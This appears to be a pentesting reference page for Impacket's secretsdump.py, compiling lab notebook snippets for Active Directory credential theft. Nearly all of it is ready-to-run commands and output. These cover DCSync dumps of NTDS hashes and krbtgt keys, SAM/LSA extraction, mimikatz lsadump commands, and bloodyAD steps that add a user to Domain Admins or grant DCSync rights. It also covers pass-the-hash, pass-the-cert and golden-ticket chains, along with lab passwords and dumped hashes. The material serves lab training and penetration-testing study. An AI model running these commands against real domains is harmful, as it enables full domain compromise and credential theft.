---
title: "secretsdump.py"
sidebarTitle: "secretsdump.py"
description: "Extract credentials with the required local or replication rights."
keywords: ["secretsdump", "secretsdump.py", "impacket-secretsdump"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/secretsdump.md. Edit the Markdown source, then run scripts/sync_site.py. */}

Replace UPPER_CASE values with your lab values.

[Search this tool’s saved examples](/commands/notebook?tool=secretsdump) · [All tools](/index)

## Commands

**Kali**

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
# DCSync: requires directory replication rights
impacket-secretsdump -just-dc 'DOMAIN/USER:PASSWORD@DC_IP'
```

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

23 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="10. Domain compromise (DCSync)">

### 10. Domain compromise (DCSync)

**Active Directory Attack Path: Worked Lab**

```bash
# Q1 — the Administrator NTLM hash
proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11 -just-dc-user Administrator
#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::

# full domain (krbtgt = Golden Ticket persistence, + every account)
proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11
proxychains nxc smb 172.16.119.11 -u stom -p 'calves-warp-learning1' --ntds

# command execution on the DC (the objective)
proxychains evil-winrm -i 172.16.119.11 -u stom -p 'calves-warp-learning1'
# or Pass-the-Hash as Administrator:
proxychains evil-winrm -i 172.16.119.11 -u Administrator -H <NTHASH>
```

**Active Directory Attack Path: Worked Lab**

Context from the notebook: If you  do  have NTDS.dit + SYSTEM hive (e.g. via  ntdsutil /VSS), parse offline:  impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

```text
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

</Accordion>

<Accordion title="Credential / Hash Operations">

### Credential / Hash Operations

**Active Directory Enumeration Commands**

```bash
secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
    # Dump credential material if sufficiently privileged

secretsdump.py -just-dc '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
    # Extract NTDS domain credentials if sufficiently privileged

hashcat -m 13100 hashes.txt wordlist.txt
    # Crack Kerberos TGS-REP hashes
```

</Accordion>

<Accordion title="Group → DCSync chain (what we&#x27;d have done with bdavid if those edges were outbound)">

### Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)

**BloodHound: Full Reference**

```bash
# 1. add yourself to a powerful group (GenericAll/AddMember on it)
proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add groupMember "Domain Admins" <you>
# 2. or grant DCSync rights directly (WriteDacl on the domain)
proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <you>
# 3. then replicate
proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
```

</Accordion>

<Accordion title="Performing DCSync with secretsdump.py">

### Performing DCSync with secretsdump.py

**Child to Parent Trusts - Linux**

```shellsession
grcic550@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

</Accordion>

<Accordion title="Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py">

### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

**DCSync Lab**

```shellsession
grcic550@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

</Accordion>

<Accordion title="Local credential dumping">

### Local credential dumping

**DCSync and Credential Dumping: Quick Reference**

```bash
# from SAM (local accounts) + LSA
secretsdump.py -sam sam.save -system system.save LOCAL
nxc smb $IP -u admin -H <hash> --sam --lsa
# Windows, in memory
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

</Accordion>

<Accordion title="Tools for this service">

### Tools for this service

**DCSync and Credential Dumping: Quick Reference**

```bash
# DCSync (Impacket) — dump the domain
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc-user krbtgt   # for golden tickets
# NetExec
nxc smb $DC -u USER -p PASS --ntds
```

</Accordion>

<Accordion title="Original captured examples">

### Original captured examples

**Impacket: Script Quick Reference**

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```

</Accordion>

<Accordion title="No PKINIT? → PassTheCert (fallback)">

### No PKINIT? → PassTheCert (fallback)

**Pass the Certificate: PKINIT and Lab Walkthrough**

```bash
certipy cert -pfx dc01.pfx -nokey  -out dc01.crt
certipy cert -pfx dc01.pfx -nocert -out dc01.key
python3 passthecert.py -action modify_user -crt dc01.crt -key dc01.key \
  -domain inlanefreight.local -dc-ip 10.129.234.174 -target wwhite -elevate
impacket-secretsdump 'inlanefreight.local/wwhite:package5shores_topher1'@10.129.234.174 -just-dc-user Administrator
```

</Accordion>

<Accordion title="Step 3 — DCSync the Administrator hash">

### Step 3 — DCSync the Administrator hash

**Pass the Certificate: PKINIT and Lab Walkthrough**

```bash
impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip 10.129.234.174 \
  'INLANEFREIGHT.LOCAL/dc01$@dc01.inlanefreight.local'
#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NThash>:::

# if impacket's secretsdump errors, use netexec with the same ticket:
nxc smb 10.129.234.174 -k --use-kcache --ntds --user Administrator
```

</Accordion>

<Accordion title="11. Attacking SAM, SYSTEM &amp; SECURITY">

### 11. Attacking SAM, SYSTEM & SECURITY

**Password Attacks: Cracking, Files, and Credential Stores**

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

</Accordion>

<Accordion title="2. SAM / LSA secrets / cached (local + service creds)">

### 2. SAM / LSA secrets / cached (local + service creds)

**Windows Post-Exploitation: Field Reference**

```cmd
mimikatz # lsadump::sam            :: local account NTLM hashes (from SAM)
mimikatz # lsadump::secrets        :: LSA secrets = service-account PLAINTEXT passwords
mimikatz # lsadump::cachedump      :: cached domain logons (crackable as $DCC2$)
:: or remotely from Kali with admin creds:
impacket-secretsdump 'domain/user:pass'@<host>
```

</Accordion>

<Accordion title="3. DCSync (Domain Admin → any hash, no host access)">

### 3. DCSync (Domain Admin → any hash, no host access)

**Windows Post-Exploitation: Field Reference**

```bash
impacket-secretsdump 'domain/DA_user:pass'@<DC> -just-dc-user Administrator
impacket-secretsdump 'domain/DA_user:pass'@<DC> -just-dc-user krbtgt    # Golden Ticket persistence
mimikatz # lsadump::dcsync /domain:nexura.htb /user:Administrator
```

</Accordion>

<Accordion title="C. SeBackup / SeRestore → read any file">

### C. SeBackup / SeRestore → read any file

**Windows Post-Exploitation: Field Reference**

```cmd
:: grab SAM + SYSTEM (local account hashes)
reg save HKLM\SAM  C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
:: on a DC, snapshot NTDS via diskshadow + robocopy /b (backup mode), then:
:: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

</Accordion>

<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">

### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)

**Active Directory Attack Path: Worked Lab**

Context from the notebook: impacket-secretsdump: No module named 'pkg_resources' Running inside a venv missing setuptools deactivate  (use system impacket) or  pip install setuptools

```text
impacket-secretsdump: No module named 'pkg_resources'
```

</Accordion>

<Accordion title="Delegation &amp; domain edges">

### Delegation & domain edges

**BloodHound: Full Reference**

Context from the notebook: DCSync / GetChanges / GetChangesAll Replicate secrets from the DC impacket-secretsdump 'dom/user:pass'@&lt;DC>  (dumps everything incl. krbtgt)

```text
impacket-secretsdump 'dom/user:pass'@<DC>
```

</Accordion>

<Accordion title="Impacket: Script Quick Reference">

### Impacket: Script Quick Reference

**Impacket: Script Quick Reference**

Context from the notebook: Credential extraction / replication secretsdump.py  /  impacket-secretsdump DCSync prerequisites and methods

```text
secretsdump.py
```

</Accordion>

<Accordion title="Prerequisites — getting the hash">

### Prerequisites — getting the hash

**Pass the Hash from Linux and Windows**

Context from the notebook: NTDS.dit on a Domain Controller  — every domain account's hash (via DCSync /  secretsdump -just-dc ).

```text
secretsdump -just-dc
```

</Accordion>

<Accordion title="The core idea: secrets, not passwords">

### The core idea: secrets, not passwords

**Windows Authentication: NTLM and Kerberos**

Context from the notebook: NTDS.dit  (on a DC) NT hashes + Kerberos keys of  every domain  account DCSync,  ntdsutil /VSS copy,  secretsdump.py -just-dc

```text
secretsdump.py -just-dc
```

</Accordion>

<Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">

### 🧾 QUICK REFERENCE — "I see X → do Y"

**Windows Post-Exploitation: Field Reference**

Context from the notebook: DA credential obtained secretsdump -just-dc-user Administrator  / krbtgt

```text
secretsdump -just-dc-user Administrator
```

</Accordion>

<Accordion title="Using Domain Controller NTLM Hash to DCSync">

### Using Domain Controller NTLM Hash to DCSync

**Historical AD Vulnerability Labs · older reference**

```shellsession
grcic550@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

</Accordion>

<Accordion title="Using Domain Controller TGT to DCSync">

### Using Domain Controller TGT to DCSync

**Historical AD Vulnerability Labs · older reference**

```shellsession
grcic550@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

</Accordion>

</AccordionGroup>
